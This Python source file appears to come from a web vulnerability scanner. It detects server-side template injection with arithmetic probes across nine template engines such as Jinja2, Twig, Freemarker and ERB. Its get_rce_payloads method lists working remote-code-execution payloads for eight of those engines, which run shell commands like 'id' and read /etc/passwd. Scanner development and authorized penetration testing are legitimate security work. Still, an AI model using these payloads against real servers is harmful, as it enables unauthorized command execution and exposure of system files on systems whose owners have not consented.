"""
Detects Server-Side Template Injection vulnerabilities
"""
from dataclasses import dataclass
from typing import List, Optional, Tuple
from enum import Enum
import re


class TemplateEngine(Enum):
    """Supported template engines"""
    JINJA2 = "Jinja2"
    DJANGO = "Django"
    TWIG = "Twig"
    FREEMARKER = "Freemarker"
    VELOCITY = "Velocity"
    SMARTY = "Smarty"
    MAKO = "Mako"
    ERB = "ERB"
    THYMELEAF = "Thymeleaf"
    UNKNOWN = "Unknown"


@dataclass
class SSTIProbe:
    """A template injection probe"""
    payload: str
    expected_result: str
    engine: TemplateEngine
    description: str


@dataclass
class SSTIVulnerability:
    """Detected SSTI vulnerability"""
    parameter: str
    engine: TemplateEngine
    probe_payload: str
    probe_result: str
    context_before: str
    context_after: str
    confidence: float


class SSTIDetector:
    """Detects SSTI vulnerabilities using mathematical probes"""

    # Mathematical expression probes for different template engines
    PROBES = [
        # Django (Python) - uses filters, not math expressions
        SSTIProbe("{{'django'|upper}}", "DJANGO", TemplateEngine.DJANGO, "Django filter test"),

        # Jinja2 / Twig (Python/PHP)
        SSTIProbe("{{7*7}}", "49", TemplateEngine.JINJA2, "Jinja2/Twig basic math"),
        SSTIProbe("{{7*'7'}}", "7777777", TemplateEngine.JINJA2, "Jinja2 string multiplication"),

        # Freemarker (Java)
        SSTIProbe("${7*7}", "49", TemplateEngine.FREEMARKER, "Freemarker basic math"),
        SSTIProbe("#{7*7}", "49", TemplateEngine.FREEMARKER, "Freemarker alternate syntax"),

        # Velocity (Java)
        SSTIProbe("#set($x=7*7)$x", "49", TemplateEngine.VELOCITY, "Velocity variable math"),

        # Smarty (PHP)
        SSTIProbe("{7*7}", "49", TemplateEngine.SMARTY, "Smarty basic math"),

        # Mako (Python)
        SSTIProbe("${7*7}", "49", TemplateEngine.MAKO, "Mako basic math"),

        # ERB (Ruby)
        SSTIProbe("<%= 7*7 %>", "49", TemplateEngine.ERB, "ERB basic math"),

        # Thymeleaf (Java)
        SSTIProbe("[[${7*7}]]", "49", TemplateEngine.THYMELEAF, "Thymeleaf basic math"),
    ]

    def __init__(self):
        pass

    def detect_ssti(self, response_text: str, probe_payload: str, expected: str) -> Optional[Tuple[str, str, str]]:
        """
        Check if SSTI probe succeeded

        Args:
            response_text: HTML response
            probe_payload: The probe payload that was injected
            expected: Expected result (e.g., "49")

        Returns:
            Tuple of (found_result, context_before, context_after) if found, None otherwise
        """
        # Look for the expected result in the response
        # We need to find it in a context where it's clearly from template execution

        # First, check if expected result is in the response at all
        if expected not in response_text:
            return None

        # Find all occurrences of the expected result
        pattern = re.escape(expected)
        matches = list(re.finditer(pattern, response_text))

        for match in matches:
            start_idx = match.start()
            end_idx = match.end()

            # Get context around the match
            context_start = max(0, start_idx - 50)
            context_end = min(len(response_text), end_idx + 50)

            context_before = response_text[context_start:start_idx]
            context_after = response_text[end_idx:context_end]

            # Make sure this isn't just the probe payload being reflected as-is
            # Check if the probe syntax is NOT present around this result
            surrounding = response_text[context_start:context_end]
            if probe_payload not in surrounding:
                # This looks like template execution!
                return (expected, context_before, context_after)

        return None

    def get_rce_payloads(self, engine: TemplateEngine) -> List[str]:
        """
        Get RCE payloads for a specific template engine

        Args:
            engine: Detected template engine

        Returns:
            List of RCE payloads to try
        """
        payloads = {
            TemplateEngine.JINJA2: [
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[400]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
                "{{lipsum.__globals__.os.popen('id').read()}}",
                "{{''.join(lipsum.__globals__.os.popen('cat /etc/passwd').readlines())}}",
            ],
            TemplateEngine.TWIG: [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
                "{{['cat /etc/passwd']|filter('system')}}",
            ],
            TemplateEngine.FREEMARKER: [
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}",
            ],
            TemplateEngine.VELOCITY: [
                "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($chr=$x.class.forName('java.lang.Character'))##\n#set($str=$x.class.forName('java.lang.String'))##\n#set($ex=$rt.getRuntime().exec('id'))##\n$ex.waitFor()\n#set($out=$ex.getInputStream())##\n#foreach($i in [1..$out.available()])$chr.toString($out.read())#end",
            ],
            TemplateEngine.SMARTY: [
                "{system('id')}",
                "{system('cat /etc/passwd')}",
            ],
            TemplateEngine.MAKO: [
                "${__import__('os').popen('id').read()}",
                "${__import__('os').popen('cat /etc/passwd').read()}",
            ],
            TemplateEngine.ERB: [
                "<%= system('id') %>",
                "<%= `id` %>",
                "<%= IO.popen('id').readlines() %>",
            ],
            TemplateEngine.THYMELEAF: [
                "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
                "[[${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}]]",
            ],
        }

        return payloads.get(engine, [])
